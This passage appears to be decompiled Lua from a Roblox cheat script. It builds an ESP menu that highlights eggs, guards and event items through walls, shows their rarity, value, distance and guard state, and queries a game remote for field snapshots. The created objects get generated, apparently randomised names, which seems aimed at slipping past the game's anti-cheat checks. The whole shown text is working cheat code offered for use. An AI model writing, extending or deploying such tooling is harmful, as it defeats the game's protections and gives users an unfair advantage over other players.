tbl19.Stroke = sequence2(tbl20)
end
tbl19.Outline = Color3.fromRGB(255, 255, 255)
local n13
n13 = 0.8
local n14
n14 = 4.5
local n15
n15 = 20
local n16
n16 = 0.002
local tbl20
tbl20 = { Golden = tbl6.Palettes.Gold }
do
local silver = {}
local sequence2 = tbl6.Sequence
local tbl21 = {}
local tbl22 = { 0, Color3.fromRGB(255, 255, 255) }
local tbl23 = { 0.45, Color3.fromRGB(214, 222, 232) }
local tbl24 = { 1, Color3.fromRGB(150, 160, 175) }
tbl21[1] = tbl22
tbl21[2] = tbl23
tbl21[3] = tbl24
silver.Text = sequence2(tbl21)
local sequence3 = tbl6.Sequence
local tbl25 = {}
local tbl26 = { 0, Color3.fromRGB(60, 66, 78) }
local tbl27 = { 0.55, Color3.fromRGB(30, 33, 40) }
local tbl28 = { 1, Color3.fromRGB(10, 11, 14) }
tbl25[1] = tbl26
tbl25[2] = tbl27
tbl25[3] = tbl28
silver.Stroke = sequence3(tbl25)
silver.Outline = Color3.fromRGB(214, 222, 232)
tbl20.Silver = silver
end
tbl20.Sakura = tbl6.PaletteFromColor(Color3.fromRGB(255, 158, 216))
tbl20.GreatBloom = tbl6.PaletteFromColor(Color3.fromRGB(124, 255, 196))
tbl20.Boss = tbl6.PaletteFromColor(Color3.fromRGB(255, 122, 122))
tbl20.Monstrous = tbl6.PaletteFromColor(Color3.fromRGB(192, 139, 255))
do
local rainbow = {}
local sequence2 = tbl6.Sequence
local tbl21 = {}
local tbl22 = { 0, Color3.fromRGB(255, 107, 107) }
local tbl23 = { 0.2, Color3.fromRGB(255, 179, 107) }
local tbl24 = { 0.4, Color3.fromRGB(255, 240, 107) }
local tbl25 = { 0.6, Color3.fromRGB(107, 255, 138) }
local tbl26 = { 0.8, Color3.fromRGB(107, 200, 255) }
local tbl27 = { 1, Color3.fromRGB(185, 107, 255) }
tbl21[1] = tbl22
tbl21[2] = tbl23
tbl21[3] = tbl24
tbl21[4] = tbl25
tbl21[5] = tbl26
tbl21[6] = tbl27
rainbow.Text = sequence2(tbl21)
local sequence3 = tbl6.Sequence
local tbl28 = {}
local tbl29 = { 0, Color3.fromRGB(20, 20, 30) }
local tbl30 = { 1, Color3.fromRGB(8, 8, 12) }
tbl28[1] = tbl29
tbl28[2] = tbl30
rainbow.Stroke = sequence3(tbl28)
rainbow.Outline = Color3.fromRGB(255, 255, 255)
rainbow.Rotation = 0
tbl20.Rainbow = rainbow
end
local v13
v13 = tbl6.PaletteFromColor(Color3.fromRGB(143, 227, 255))
local rfEggWorldAskFieldEggSnapshot
rfEggWorldAskFieldEggSnapshot = networking:FindFirstChild("RF/EggWorld/AskFieldEggSnapshot")
local n17
n17 = 0
local tbl21
tbl21 = {
Eggs = false,
MinRarity = 5,
Specific = {},
MutationSet = {},
AnyMutation = false,
NoMutation = false,
Info = {},
Highlight = tbl9[1],
MinValue = 0,
HighlightMin = 6,
MaxDistance = math.huge,
SizeScale = 0.75,
FixedSize = false,
OwnBase = true,
}
for _, v14 in ipairs(tbl8) do
tbl21.Info[v14] = true
end
local tbl22
tbl22 = {}
local tbl23, v14, flag2, n18, n19, flag3, v15, n20, fn16
local tbl24 = {}
tbl23 = {}
v14 = nil
flag2 = false
n18 = 0
n19 = 0
flag3 = false
v15 = nil
n20 = 0
fn16 = function(arg)
local v16 = tbl24[arg]
if v16 then
return v16
end
local directory = tbl.Assets and tbl.Assets.Directory
local flag4 = type(directory) == "table" and directory[arg]
local rarity = type(flag4) == "table" and type(flag4.Rarity) == "table" and flag4.Rarity or nil
local color3 = rarity and typeof(rarity.Color) == "Color3" and rarity.Color or Color3.new(1, 1, 1)
local v17 = tbl6.PaletteFromColor(color3)
local rarityGradient = rarity and rarity.RarityGradient
if rarity and typeof(rarityGradient) ~= "Instance" then
rarityGradient = ReplicatedStorage:FindFirstChild("Assets")
rarityGradient = rarityGradient and rarityGradient:FindFirstChild("UI")
rarityGradient = rarityGradient and rarityGradient:FindFirstChild("RarityGradients")
if rarityGradient then
rarityGradient = rarityGradient:FindFirstChild(tostring(rarity._id or rarity.DisplayName or ""))
end
rarityGradient = rarityGradient and rarityGradient:FindFirstChild("RarityGradient") or nil
end
if typeof(rarityGradient) == "Instance" and rarityGradient:IsA("UIGradient") then
v17.Text = rarityGradient.Color
v17.Rotation = rarityGradient.Rotation
end
local str
if rarity then
str = tostring(rarity.DisplayName or rarity._id or "")
else
str = rarity
end
local name = str or ""
local rarityPalette
if string.upper(name) ~= "SECRET" then
rarityPalette = v17
else
rarityPalette = { Text = v11, Stroke = v17.Stroke, Outline = v17.Outline, Rotation = 90 }
end
local tbl25 = {}
if rarity then
rarity = tonumber(rarity.RarityNumber or rarity.Rank)
end
tbl25.Number = rarity or 0
tbl25.Name = name
tbl25.Color = color3
tbl25.Palette = v17
tbl25.RarityPalette = rarityPalette
local displayName = type(flag4) == "table"
if displayName then
displayName = tostring(flag4.DisplayName or arg)
end
tbl25.DisplayName = displayName or tostring(arg)
tbl25.Icon = type(flag4) == "table" and flag4.Icon or nil
tbl25.EarningRate = type(flag4) == "table" and tonumber(flag4.EarningRate) or 0
tbl24[arg] = tbl25
return tbl25
end
local fn17, fn18, fn19, fn20, tbl25, fn21
do
local function fn22(arg)
local areaEggSlotsClient = workspace:FindFirstChild("AreaEggSlotsClient")
areaEggSlotsClient = areaEggSlotsClient and areaEggSlotsClient:FindFirstChild(arg)
if areaEggSlotsClient and areaEggSlotsClient:IsA("Model") then
local hitbox = areaEggSlotsClient:FindFirstChild("Hitbox")
return areaEggSlotsClient, hitbox and hitbox:IsA("BasePart") and hitbox or nil
end
return nil, nil
end
fn17 = function()
if not v15 or not v15.Parent then
v15 = tbl6.CreateRuntime()
end
end
local function fn23(arg)
local n21 = tonumber(arg) or 0
local tbl26 = { "", "K", "M", "B", "T", "Qa", "Qi" }
local n22 = 1
while math.abs(n21) >= 1000 and n22 < #tbl26 do
n21 /= 1000
n22 += 1
end
return string.format(n22 == 1 and "%.0f%s" or "%.2f%s", n21, tbl26[n22])
end
local function fn24(arg)
local currentCamera = workspace.CurrentCamera
if not currentCamera then
return tbl21.MaxDistance
end
return math.min(tbl21.MaxDistance, arg * currentCamera.ViewportSize.Y / 2 * n15 * math.tan(math.rad(currentCamera.FieldOfView) * 0.5))
end
local function fn25(arg)
local tbl26 = {
{ arg.IconHolder, tbl10.Icon, arg.ShowIcon },
{ arg.NameRow.Holder, tbl10.Name, arg.ShowName },
{ arg.RarityRow.Holder, tbl10.Rarity, arg.ShowRarity },
{ arg.MutationRow.Holder, tbl10.Mutation, arg.ShowMutation },
{ arg.ValueRow.Holder, tbl10.Value, arg.ShowValue },
{ arg.ExtraRow.Holder, tbl10.Info, arg.ShowExtra },
}
local v16, v17, v18 = ipairs(tbl26)
local n21 = 0
for _, v19 in v16, v17, v18 do
if v19[3] then
n21 += v19[2]
end
end
local n22 = math.max(n21, 1)
for _, v19 in ipairs(tbl26) do
v19[1].Visible = v19[3]
v19[1].Size = UDim2.fromScale(1, v19[3] and v19[2] / n22 or 0)
end
local v19 = tbl6.ScaledWidth(120, tbl21.SizeScale)
local height = math.max(1, math.floor(tbl6.RowHeight(tbl21.SizeScale) * n22))
if arg.Width ~= v19 or arg.Height ~= height or arg.Fixed ~= tbl21.FixedSize then
arg.Width = v19
arg.Height = height
arg.Fixed = tbl21.FixedSize
if tbl21.FixedSize then
local n23 = n14 * tbl21.SizeScale
arg.Billboard.Size = UDim2.fromScale(n23, n23 * height / v19)
arg.Billboard.MaxDistance = fn24(n23)
else
arg.Billboard.Size = UDim2.fromOffset(v19, height)
arg.Billboard.MaxDistance = tbl21.MaxDistance
end
end
end
fn18 = function(arg)
arg.Width = nil
fn25(arg)
end
local function fn26()
local v16, v17 = tbl6.CreateTag(v15, tbl21.MaxDistance)
local frame = Instance.new("Frame")
frame.Name = fn3()
frame.BackgroundTransparency = 1
frame.BorderSizePixel = 0
frame.LayoutOrder = 0
frame.Parent = v17
local imageLabel = Instance.new("ImageLabel")
imageLabel.Name = fn3()
imageLabel.AnchorPoint = Vector2.new(0.5, 1)
imageLabel.BackgroundTransparency = 1
imageLabel.Position = UDim2.fromScale(0.5, 1)
imageLabel.Size = UDim2.fromScale(1, 1)
imageLabel.ScaleType = Enum.ScaleType.Fit
imageLabel.Parent = frame
local uiAspectRatioConstraint = Instance.new("UIAspectRatioConstraint")
uiAspectRatioConstraint.Name = fn3()
uiAspectRatioConstraint.AspectRatio = 1
uiAspectRatioConstraint.DominantAxis = Enum.DominantAxis.Height
uiAspectRatioConstraint.Parent = imageLabel
local tbl26 = {
Billboard = v16,
IconHolder = frame,
Icon = imageLabel,
NameRow = tbl6.CreateTextRow(v17, tbl6.MainFont, 1, 0.4),
RarityRow = tbl6.CreateTextRow(v17, v6, 2, 0.2),
MutationRow = tbl6.CreateTextRow(v17, tbl6.MainFont, 3, 0.2),
ValueRow = tbl6.CreateTextRow(v17, tbl6.MainFont, 4, 0.2),
ExtraRow = tbl6.CreateTextRow(v17, tbl6.MainFont, 5, 0.2),
Highlight = nil,
Anchor = nil,
CFrame = nil,
Width = nil,
Height = nil,
ShowIcon = false,
ShowName = true,
ShowRarity = false,
ShowMutation = false,
ShowValue = false,
ShowExtra = false,
}
fn25(tbl26)
return tbl26
end
local function fn27(arg)
if arg.Highlight then
arg.Highlight:Destroy()
arg.Highlight = nil
n20 -= 1
end
end
local function fn28(arg, arg2)
local n21 = tonumber(arg.AssetScale) or 1
local n22 = n21 > 5 and (n21 / 5) ^ 1.2 * 19.637875755794113 or n21 ^ 1.85
local mutations = tbl.Mutations
local flag4 = type(mutations) == "table" and type(mutations.EarningsFor) == "function"
local n23 = 1
if flag4 then
local ok
ok, n23 = pcall(mutations.EarningsFor, type(arg.Mutations) == "table" and arg.Mutations or {})
ok = ok and type(n23) == "number"
local n24 = 1
if not ok then
n23 = n24
end
end
return arg2.EarningRate * n22 * n23
end
local function fn29()
local tbl26 = {}
local eggState = tbl.EggState
local placedEggRenders = workspace:FindFirstChild("PlacedEggRenders")
if not placedEggRenders or type(eggState) ~= "table" or type(eggState.ReadOwnerEggs) ~= "function" then
return tbl26
end
local ok, result = pcall(eggState.ReadOwnerEggs, localPlayer.UserId)
if not ok or type(result) ~= "table" then
return tbl26
end
local str = tostring(localPlayer.UserId)
local tbl27 = {}
for _, child in ipairs(placedEggRenders:GetChildren()) do
if string.find(child.Name, str, 1, true) then
tbl27[#tbl27 + 1] = child
end
end
for k, v16 in pairs(result) do
if type(v16) == "table" and v16.Placement ~= nil and type(v16.AssetCategory) == "string" then
local base = tostring(k)
local v17 = nil
for _, v18 in ipairs(tbl27) do
if v18.Name == base or string.find(v18.Name, base, 1, true) or v18:GetAttribute("Uid") == base then
v17 = v18
break
end
end
if v17 then
local ok2, result2 = pcall(function()
return v17:IsA("Model") and v17:GetPivot() or v17.CFrame
end)
local mutations = type(v16.Mutations) == "table" and v16.Mutations or {}
tbl26[#tbl26 + 1] = {
Uid = "base:" .. base,
AssetCategory = v16.AssetCategory,
AssetScale = v16.AssetScale,
Mutations = mutations,
BaseMutation = v16.BaseMutation or mutations[1],
State = "Base",
AreaId = "Your Base",
BottomCFrame = ok2 and result2 or nil,
Model = v17,
}
end
end
end
return tbl26
end
local function fn30(arg, arg2)
if arg.State == "Claimed" then
return false
end
if tbl21.MinRarity > 0 and arg2.Number < tbl21.MinRarity then
return false
end
local flag4 = tbl21.MinValue > 0
if flag4 then
local minValue = tbl21.MinValue
flag4 = fn28(arg, arg2) < minValue
end
if flag4 then
return false
end
return true
end
local function fn31(arg, arg2, arg3)
local model, isBasePart
if typeof(arg2.Model) == "Instance" then
model = arg2.Model
local hitbox = model:FindFirstChild("Hitbox", true) or model:FindFirstChildWhichIsA("BasePart", true)
isBasePart = hitbox and hitbox:IsA("BasePart") and hitbox or nil
else
model, isBasePart = fn22(arg2.Uid)
end
local bottomCFrame = arg2.BottomCFrame
if typeof(bottomCFrame) == "CFrame" then
local terrain = isBasePart or workspace.Terrain
if arg.Anchor ~= terrain or arg.CFrame ~= bottomCFrame then
arg.Anchor = terrain
arg.CFrame = bottomCFrame
arg.Billboard.Adornee = terrain
arg.Billboard.StudsOffsetWorldSpace = bottomCFrame.Position - terrain.Position + Vector3.new(0, (isBasePart and isBasePart.Position.Y - bottomCFrame.Position.Y or 1) + n13, 0)
end
end
local info = tbl21.Info
local baseMutation = arg2.BaseMutation
local showMutation = type(baseMutation) == "string" and baseMutation ~= ""
local n21 = tonumber(arg2.AssetScale) or 1
local showIcon = info.Icon == true and arg3.Icon ~= nil
if showIcon and arg.Icon.Image ~= tostring(arg3.Icon) then
arg.Icon.Image = tostring(arg3.Icon)
end
local showName = info.Name == true
if showName then
tbl6.SetRow(arg.NameRow, arg3.DisplayName, tbl19)
end
local showRarity = info.Rarity == true and arg3.Name ~= ""
if showRarity then
local rarityPalette = arg3.RarityPalette
tbl6.SetRow(arg.RarityRow, string.upper(arg3.Name), rarityPalette)
end
showMutation = info.Mutation == true and showMutation
if showMutation then
tbl6.SetRow(arg.MutationRow, string.upper(fn7(baseMutation)), tbl20[baseMutation] or v13)
end
local showValue = info.Value == true
if showValue then
tbl6.SetRow(arg.ValueRow, "$" .. fn23(fn28(arg2, arg3)) .. "/s", v12)
end
local tbl26 = {}
local eggRecords = tbl.EggRecords
if info.Weight and type(eggRecords) == "table" and type(eggRecords.WeightKgForScale) == "function" then
local ok, result = pcall(eggRecords.WeightKgForScale, arg2.AssetCategory, n21)
if ok and tonumber(result) then
table.insert(tbl26, fn23(result) .. " kg")
end
end
if info.Size then
table.insert(tbl26, string.format("x%.2f", n21))
end
if info["Sell Price"] and type(eggRecords) == "table" and type(eggRecords.SellPrice) == "function" then
local ok, result = pcall(eggRecords.SellPrice, arg2)
if ok and tonumber(result) then
table.insert(tbl26, "$" .. fn23(result))
end
end
if info.Distance and typeof(bottomCFrame) == "CFrame" then
local character = localPlayer.Character
character = character and character:FindFirstChild("HumanoidRootPart")
if character then
table.insert(tbl26, string.format("%dm", math.floor((character.Position - bottomCFrame.Position).Magnitude + 0.5)))
end
end
if info.Area and arg2.AreaId ~= nil then
table.insert(tbl26, tostring(arg2.AreaId))
end
if info.State and arg2.State ~= nil and arg2.State ~= "Slot" then
table.insert(tbl26, tostring(arg2.State))
end
local showExtra = #tbl26 > 0
if showExtra then
tbl6.SetRow(arg.ExtraRow, table.concat(tbl26, "  |  "), tbl6.Palettes.Sheen)
end
if arg.ShowIcon ~= showIcon or arg.ShowName ~= showName or arg.ShowRarity ~= showRarity or arg.ShowMutation ~= showMutation or arg.ShowValue ~= showValue or arg.ShowExtra ~= showExtra then
arg.ShowIcon = showIcon
arg.ShowName = showName
arg.ShowRarity = showRarity
arg.ShowMutation = showMutation
arg.ShowValue = showValue
arg.ShowExtra = showExtra
fn25(arg)
end
local flag4 = tbl21.Highlight == tbl9[3]
local flag5
if flag4 then
flag5 = flag4
else
flag5 = tbl21.Highlight == tbl9[2] and arg3.Number >= tbl21.HighlightMin
end
if flag5 and model then
if not arg.Highlight and n20 < n then
local highlight = Instance.new("Highlight")
highlight.Name = fn3()
highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
highlight.FillTransparency = 0.82
highlight.OutlineTransparency = 0.05
highlight.FillColor = arg3.Color
highlight.OutlineColor = arg3.Palette.Outline
highlight.Parent = v15
arg.Highlight = highlight
n20 += 1
end
if arg.Highlight and arg.Highlight.Adornee ~= model then
arg.Highlight.Adornee = model
end
else
fn27(arg)
end
end
local function fn32(arg)
fn27(arg)
arg.Billboard:Destroy()
end
local function fn33()
local v16 = tbl22
local v17 = v15
tbl22 = {}
v15 = nil
n20 = 0
task.spawn(function()
local now = os.clock()
for _, v18 in pairs(v16) do
if v18.Highlight then
v18.Highlight:Destroy()
end
v18.Billboard:Destroy()
if n16 < os.clock() - now then
RunService.Heartbeat:Wait()
now = os.clock()
end
end
if v17 then
v17:Destroy()
end
end)
end
local function fn34(arg, arg2, arg3)
local function fn35()
return arg2 == n19 and arg3 == n18 and flag2
end
fn17()
local tbl26 = {}
local now = os.clock()
for _, v16 in pairs(arg) do
local uid = type(v16) == "table" and v16.Uid
if type(uid) == "string" and type(v16.AssetCategory) == "string" then
local v17 = fn16(v16.AssetCategory)
if tbl21.Eggs and fn30(v16, v17) then
tbl26[uid] = true
local v18 = tbl22[uid]
if not v18 then
local v19 = fn26()
tbl22[uid] = v19
v18 = v19
end
fn31(v18, v16, v17)
end
end
if os.clock() - now > n16 then
RunService.Heartbeat:Wait()
now = os.clock()
if not fn35() then
return
end
end
end
if tbl21.Eggs and tbl21.OwnBase then
for _, v16 in ipairs(fn29()) do
local v17 = fn16(v16.AssetCategory)
if fn30(v16, v17) then
tbl26[v16.Uid] = true
local v18 = tbl22[v16.Uid]
if not v18 then
v18 = fn26()
tbl22[v16.Uid] = v18
end
fn31(v18, v16, v17)
end
end
end
for k, v16 in pairs(tbl22) do
if not tbl26[k] then
tbl22[k] = nil
fn32(v16)
end
end
return true
end
local flag4 = false
local flag5 = false
fn19 = function()
if not flag2 or not v14 then
return
end
flag4 = true
if flag5 then
return
end
flag5 = true
task.defer(function()
while flag2 and v14 and flag4 do
flag4 = false
n19 += 1
local ok, result = pcall(fn34, v14, n19, n18)
if ok and result ~= true then
flag4 = true
end
RunService.Heartbeat:Wait()
end
flag5 = false
end)
end
local function fn35()
local v16 = n18
if v14 and next(tbl22) == nil then
fn19()
end
local eggState = tbl.EggState
local flag6 = type(eggState) == "table" and type(eggState.ReadFieldEggs) == "function"
local records = nil
if flag6 then
local ok, result = pcall(eggState.ReadFieldEggs)
ok = ok and type(result) == "table" and type(result.Records) == "table"
records = nil
if ok then
records = result.Records
end
end
if records == nil and rfEggWorldAskFieldEggSnapshot and os.clock() >= n17 then
n17 = os.clock() + 30
local ok, result = pcall(rfEggWorldAskFieldEggSnapshot.InvokeServer, rfEggWorldAskFieldEggSnapshot)
if ok and type(result) == "table" and type(result.Records) == "table" then
records = result.Records
end
end
if v16 ~= n18 or not flag2 then
return
end
if records ~= nil then
local tbl26 = {}
for k, record in pairs(records) do
tbl26[k] = record
end
v14 = tbl26
end
if v14 then
fn19()
end
end
local function fn36()
task.spawn(pcall, fn35)
end
local function fn37()
if flag3 then
return
end
flag3 = true
task.delay(0.5, function()
flag3 = false
if flag2 then
fn36()
end
end)
end
fn20 = function()
for _, v16 in pairs(tbl22) do
fn18(v16)
end
end
local function fn38()
flag2 = false
n18 += 1
n19 += 1
tbl6.DisconnectAll(tbl23)
fn33()
end
local function fn39()
if flag2 then
fn36()
return
end
flag2 = true
local v16 = n18
local eggState = tbl.EggState
if type(eggState) == "table" then
for _, v17 in ipairs({ "FieldRefreshed", "FieldShifted", "FieldGone", "FieldClaimed", "SnapshotRefreshed" }) do
local v18 = eggState[v17]
if type(v18) == "table" and type(v18.Connect) == "function" then
local ok, result = pcall(v18.Connect, v18, fn37)
if ok and result then
table.insert(tbl23, result)
end
end
end
end
for _, v17 in ipairs({ "AreaEggSlotsClient", "PlacedEggRenders" }) do
local v18 = workspace:FindFirstChild(v17)
if v18 then
table.insert(tbl23, v18.ChildAdded:Connect(fn37))
table.insert(tbl23, v18.ChildRemoved:Connect(fn37))
end
end
task.spawn(function()
while v16 == n18 do
task.wait(10)
if v16 == n18 then
fn37()
continue
end
break
end
end)
task.spawn(function()
while v16 == n18 do
task.wait(1)
if v16 == n18 then
if tbl21.Info.Distance then
fn19()
end
continue
end
break
end
end)
fn36()
end
local function fn40()
if tbl21.Eggs then
fn39()
else
fn38()
end
end
tbl25 = { Eggs = nil }
local tbl26 = { Eggs = false }
local flag6 = false
local function fn41()
if flag6 then
return
end
local v16 = tbl6.ReadToggle(tbl25.Eggs, tbl26.Eggs)
if v16 == tbl21.Eggs and flag2 == v16 then
return
end
tbl21.Eggs = v16
fn40()
end
fn4(function()
flag6 = true
tbl21.Eggs = false
fn38()
end)
fn21 = function(arg)
local tbl27 = {}
if type(arg) == "table" then
for k, v16 in pairs(arg) do
k = v16 == true and type(k) == "string" and k or type(v16) == "string" and v16
local v17 = k or nil
if v17 then
tbl27[v17] = true
end
end
end
return tbl27
end
tbl25.Eggs = espSection:CreateToggle({
Name = "ESP Eggs",
Default = false,
Callback = function(arg)
tbl26.Eggs = arg == true
tbl6.SyncSoon(fn41)
end,
})
end
espSection:CreateToggle({
Name = "ESP Fixed Size",
Default = false,
SubOf = tbl25.Eggs,
Callback = function(arg)
local fixedSize = arg == true
if tbl21.FixedSize ~= fixedSize then
tbl21.FixedSize = fixedSize
fn20()
end
end,
})
espSection:CreateToggle({
Name = "ESP Own Base Eggs",
Note = "Also show the eggs placed in your own base",
Default = true,
SubOf = tbl25.Eggs,
Callback = function(arg)
tbl21.OwnBase = arg ~= false
fn19()
end,
})
do
local tbl26 = { "Any" }
local tbl27 = { Any = 0 }
local tbl28 = {}
local tbl29 = {}
local tbl30 = { "Any Mutation", "No Mutation" }
local directory = tbl.Assets and tbl.Assets.Directory
local tbl31 = {}
local tbl32 = {}
if type(directory) == "table" then
for k, v16 in pairs(directory) do
local rarity = type(v16) == "table" and v16.Rarity or nil
local flag4 = type(rarity) == "table"
if flag4 then
flag4 = tonumber(rarity.RarityNumber or rarity.Rank)
end
flag4 = flag4 or nil
if flag4 then
local str = tostring(rarity.DisplayName or rarity._id or flag4)
tbl31[flag4] = tbl31[flag4] or str
table.insert(tbl32, {
Category = tostring(k),
Name = tostring(v16.DisplayName or k),
Rarity = flag4,
RarityName = str,
})
end
end
end
local tbl33 = {}
for k in pairs(tbl31) do
table.insert(tbl33, k)
end
table.sort(tbl33)
for _, v16 in ipairs(tbl33) do
local str = string.format("%d - %s", v16, tbl31[v16])
table.insert(tbl26, str)
tbl27[str] = v16
end
table.sort(tbl32, function(arg, arg2)
if arg.Rarity ~= arg2.Rarity then
return arg.Rarity > arg2.Rarity
end
return arg.Name < arg2.Name
end)
for _, v16 in ipairs(tbl32) do
local str = string.format("%s [%s]", v16.Name, v16.RarityName)
if tbl29[str] then
str = string.format("%s [%s] (%s)", v16.Name, v16.RarityName, v16.Category)
end
table.insert(tbl28, str)
tbl29[str] = v16.Category
end
local tbl34 = {}
local mutations = tbl.Mutations
if type(mutations) == "table" and type(mutations.IdSet) == "table" then
for k in pairs(mutations.IdSet) do
table.insert(tbl34, tostring(k))
end
end
table.sort(tbl34)
for _, v16 in ipairs(tbl34) do
table.insert(tbl30, v16)
end
local function fn22(arg)
for _, v16 in ipairs(tbl26) do
if tbl27[v16] == arg then
return v16
end
end
return tbl26[1]
end
espSection:CreateDropdown({
Name = "ESP Min Rarity",
Note = "Show eggs of the chosen rarity and every rarity above it",
Options = tbl26,
Default = fn22(5),
SubOf = tbl25.Eggs,
Callback = function(arg)
tbl21.MinRarity = tbl27[type(arg) == "table" and arg[1] or arg] or 0
fn19()
end,
})
end
fn6(espSection:CreateMultiDropdown({
Name = "ESP Show Info",
Options = tbl7,
Default = tbl8,
SubOf = tbl25.Eggs,
Callback = function(arg)
tbl21.Info = fn21(arg)
fn19()
end,
}))
do
local tbl26 = {
["K/s"] = { Min = 0, Max = 1000, Mult = 1000 },
["M/s"] = { Min = 0, Max = 1000, Mult = 1000000 },
["B/s"] = { Min = 0, Max = 100, Mult = 1e9 },
}
local n21 = 0
local str = "M/s"
local function fn22(arg, arg2)
if arg ~= nil then
n21 = math.max(0, math.floor(tonumber(arg) or n21))
end
if arg2 ~= nil then
str = tostring(arg2)
end
tbl21.MinValue = n21 * (tbl26[str] or tbl26["M/s"]).Mult
fn19()
end
fn5(espSection, {
Name = "Min ESP Value",
SubOf = tbl25.Eggs,
Legacy = "ESP Min Value",
SectionName = "ESP",
OnRaw = function(arg)
fn22(math.floor(arg / 1000), "K/s")
end,
})
end
espSection:CreateSlider({
Name = "ESP Egg Size",
Min = 50,
Max = 200,
Default = 75,
Increment = 5,
Unit = "%",
SubOf = tbl25.Eggs,
Callback = function(arg)
local num = tonumber(arg)
if num and tbl21.SizeScale ~= num / 100 then
tbl21.SizeScale = num / 100
fn20()
end
end,
})
local n21
do
local n22 = 1
n21 = 0.75
local tbl26 = {
Sleeping = tbl6.Palettes.Accent,
Waking = tbl6.Palettes.Gold,
Chasing = tbl6.Palettes.Red,
}
local orange = tbl6.Palettes.Orange
local tbl27 = {}
local tbl28 = {}
local flag4 = false
local v16 = nil
local function fn22(arg)
local attribute = arg:GetAttribute("GuardState")
if attribute == "Sleeping" then
return "Sleeping"
end
if attribute == "Waking" then
return "Waking Up"
end
if attribute == "Chasing" then
local attribute2 = arg:GetAttribute("TargetPlayer")
if attribute2 == tostring(localPlayer.UserId) then
return "Chasing You"
end
local playerByUserId = tonumber(attribute2) and Players:GetPlayerByUserId(tonumber(attribute2))
return playerByUserId and "Chasing " .. playerByUserId.DisplayName or "Chasing"
end
return attribute and tostring(attribute) or "Awake"
end
local function fn23(arg, arg2)
local v17 = tbl26[arg2:GetAttribute("GuardState")] or orange
arg.Highlight.FillColor = v17.Outline
arg.Highlight.OutlineColor = v17.Outline
tbl6.SetRow(arg.StateRow, fn22(arg2), v17)
end
local function fn24(arg)
local floor = math.floor
arg.Tag.Size = UDim2.fromOffset(tbl6.ScaledWidth(115, n21), floor(tbl6.RowHeight(n21) * 1.6))
end
local function fn25(arg)
local v17 = tbl27[arg]
if not v17 then
return
end
tbl27[arg] = nil
tbl6.DisconnectAll(v17.Connections)
v17.Highlight:Destroy()
v17.Tag:Destroy()
end
local function fn26(arg, adornee)
if tbl27[adornee] then
return
end
local v17 = tbl6.FindGuardRoot(adornee)
if not v17 then
return
end
if not v16 or not v16.Parent then
v16 = tbl6.CreateRuntime()
end
local highlight = Instance.new("Highlight")
highlight.Name = fn3()
highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
highlight.FillTransparency = 0.76
highlight.OutlineTransparency = 0.02
highlight.Adornee = adornee
highlight.Parent = v16
local ok, result, result2 = pcall(adornee.GetBoundingBox, adornee)
local flag5 = ok and typeof(result) == "CFrame"
local n23 = 6
if flag5 then
n23 = result.Position.Y + result2.Y * 0.5 - v17.Position.Y + n22
end
local v18, v19 = tbl6.CreateTag(v16, math.huge)
v18.Adornee = v17
v18.StudsOffsetWorldSpace = Vector3.new(0, n23, 0)
local v20 = tbl6.CreateTextRow(v19, tbl6.StatusFont, 1, 0.45)
local v21 = tbl6.CreateTextRow(v19, tbl6.StatusFont, 2, 0.55)
local sheen = tbl6.Palettes.Sheen
tbl6.SetRow(v20, tostring(arg) .. " Guard", sheen)
local tbl29 = { Highlight = highlight, Tag = v18, StateRow = v21, Connections = {} }
tbl27[adornee] = tbl29
fn24(tbl29)
fn23(tbl29, adornee)
local function fn27()
fn23(tbl29, adornee)
end
table.insert(tbl29.Connections, adornee:GetAttributeChangedSignal("GuardState"):Connect(fn27))
table.insert(tbl29.Connections, adornee:GetAttributeChangedSignal("TargetPlayer"):Connect(fn27))
table.insert(tbl29.Connections, adornee.AncestryChanged:Connect(function()
if not adornee:IsDescendantOf(workspace) then
fn25(adornee)
end
end))
end
local function fn27()
flag4 = false
tbl6.DisconnectAll(tbl28)
for k in pairs(tbl27) do
fn25(k)
end
if v16 then
v16:Destroy()
v16 = nil
end
end
local function fn28()
if flag4 then
return
end
flag4 = true
tbl28 = tbl6.WatchGuards(fn26)
end
local v17 = nil
local flag5 = false
local flag6 = false
local function fn29()
if flag6 then
return
end
if tbl6.ReadToggle(v17, flag5) then
fn28()
elseif flag4 then
fn27()
end
end
fn4(function()
flag6 = true
fn27()
end)
v17 = espSection:CreateToggle({
Name = "ESP Guards",
Default = false,
Callback = function(arg)
flag5 = arg == true
tbl6.SyncSoon(fn29)
end,
})
espSection:CreateSlider({
Name = "ESP Guard Size",
Min = 50,
Max = 200,
Default = 75,
Increment = 5,
Unit = "%",
SubOf = v17,
Callback = function(arg)
local num = tonumber(arg)
if num and n21 ~= num / 100 then
n21 = num / 100
for _, v18 in pairs(tbl27) do
fn24(v18)
end
end
end,
})
end
do
local tbl26 = {
{ Id = "LostPart1", Label = "Mechanical Gear" },
{ Id = "LostPart2", Label = "Wiring Harness" },
}
local v16 = tbl6.PaletteFromColor(Color3.fromRGB(255, 216, 61))
local accent = tbl6.Palettes.Accent
local v17 = nil
local tbl27 = {}
local flag4 = false
local connection = nil
local v18 = nil
local flag5 = false
local flag6 = false
local function fn22(arg)
local v19 = tbl27[arg]
if not v19 then
return
end
tbl27[arg] = nil
pcall(function()
v19.Highlight:Destroy()
v19.Tag:Destroy()
end)
end
local function fn23()
local drScrambleEvent = workspace:FindFirstChild("DrScrambleEvent")
for _, v19 in ipairs(tbl26) do
local v20 = drScrambleEvent and drScrambleEvent:FindFirstChild(v19.Id)
local hitbox = v20 and (v20:FindFirstChild("Hitbox", true) or v20.PrimaryPart or v20:FindFirstChildWhichIsA("BasePart", true))
local tbl28 = tbl27[v19.Id]
if tbl28 and (tbl28.Model ~= v20 or not hitbox) then
fn22(v19.Id)
tbl28 = nil
end
if hitbox and not tbl28 then
if not v17 or not v17.Parent then
v17 = tbl6.CreateRuntime()
end
local highlight = Instance.new("Highlight")
highlight.Name = fn3()
highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
highlight.FillTransparency = 0.7
highlight.OutlineTransparency = 0.02
highlight.Adornee = v20
highlight.Parent = v17
local v21, v22 = tbl6.CreateTag(v17, 25000)
v21.Adornee = hitbox
v21.StudsOffsetWorldSpace = Vector3.new(0, 4, 0)
local floor = math.floor
v21.Size = UDim2.fromOffset(tbl6.ScaledWidth(160), floor(tbl6.RowHeight() * 1.6))
local v23 = tbl6.CreateTextRow(v22, tbl6.StatusFont, 1, 0.5)
